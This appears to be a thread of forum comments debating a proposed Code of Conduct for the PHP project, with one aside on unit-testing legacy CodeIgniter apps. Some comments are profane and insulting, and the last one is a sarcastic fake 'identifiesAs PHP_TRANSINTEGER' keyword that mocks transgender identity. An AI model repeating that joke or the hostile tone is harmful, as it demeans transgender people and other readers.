He didn't actually include your name. I came here to find out who would use the words you did. Not the model of impartial moderation, I think.
&gt; I just know too well how CoCs will be used for political activism and power grab. Specifically how. For me to believe this isn't mass paranoia or ignorance (no offense intended) I need to know what specifically has happened so far. Apart from some Mozilla guy not getting to speak at a conference because the public were fed up with him talking shit (which had nothing to do with a CoC) I've not heard anything yet. Compare that against the stories from women folk I trust of harassment and some insane bullshit you wouldn't want to have to deal with, and it's fairly easy for me to be pro-CoC.
Thank you, I shall keep that in mind and the same goes for you and others who read my post. :)
Fork it, then.
&gt; It's not a slippery slope when it actually has happened. And that's why the RFC -- not the CC, the RFC itself -- contains protections against the patterns seen in previous abusive actions. The slope is way less slippery now, and if people that are worried about abuse *contribute to making the RFC better* instead of just ranting about how it'll be the death-knell for the PHP project, I bet that adequate solutions can be found for even the edgiest of edge cases.
Depends who you're talking about. So far the loudest and most well known names supporting the RFC or trying to blog against it are white dudes yup. There's a lot more to the conversation than that, and there is a huge array of diversity on the side of people trying to get this passed. On Twitter, a lot of women, people of colour (and yes white dudes too) are saying: "Yeah obviously." "Cheers." "Thanks for the post.", whilst those shouting against me, when race/gender is known, are almost exclusively white dudes. So again: "Whenever there is a conversation like this, the overwhelming majority of people against it seem to be white dudes." Dunno why. #NotAllMen. #NotAllWhiteDudes. I don't hate white dudes. They're not "the" problem. But when there is a chat like this, there will be a lot of them there, shouting about social justice warriors or (some other crap) in large numbers.
I have to maintain a ton of CodeIgniter applications that are not trivial to just port to Laravel. Often times when I want to do TDD with a CodeIgniter app I'll use Mockery and start out my classes with public function __construct($CI = null){ if($CI === null)$CI = get_instance(); } Then I'll just mock out the CodeIgniter loader and whatever components I need to use in my tests. Eventually everything business wise is sitting in a nice PSR-4 namespace with tests and it is a ton easier to port to a newer framework. Wish I could justify rewriting a whole legacy app but it can only happen one piece at a time here.
That's exactly what it's for. It's a vague tool that can be used for any rhyme or reason to force someone to comply with your beliefs. Let's not pretend it tries to do less than that. Where are all these assholes (other than myself after every time I read about the CoC)? This idea is bad and you should feel bad.
To me this seems like a very odd and potentially paranoid view. Where do you think it comes from? CoCs at conferences are just used to remove sponsors who grope attendees and people who get so shitfaced they make other people feel uncomfortable. I've seen all of that happen. Sure at some conferences the shitfaced person might have been removed with or without a CoC, but I have heard first hand from a conference organizer before how they were terrified to remove a Platinum sponsor from the venue despite getting a huge load of complaints. So, if actions of those in charge are not effected negatively, but it can be used to solve some problems, and has so far never been used to block people based on political beliefs... why would this happen for a FOSS project? Why are conferences and FOSS projects so particularly different? And why is a FOSS CoC so different - to you - than the HR agreements we all sign at any office job, saying we can't grab each other or bring guns to work. Basically im curious about why - in your mind - this specific form of CoC (like many many others everywhere in life) is such a deeply suspect and political agenda.
&gt; Or just...you know...stop trying to silence people you don't agree with. Given the intent of the CoC that we are discussing, the irony of this statement knows no bounds...
[removed]
&gt;Thanks mom. This is offensive to my mum in general. /s
In my opinion, those in opposition are *rejecting* politics from the project. We're discussing politics in the forums, but we're trying to prevent politics from entering the project itself
The slave/master update is a good start, but we need to step it up... I vote that we do away with "labels" and casts and introduce the "identifiesAs" keyword $n = (int) $_POST['number']; $n = $_POST['number'] identifiesAs PHP_TRANSINTEGER; echo ($n); 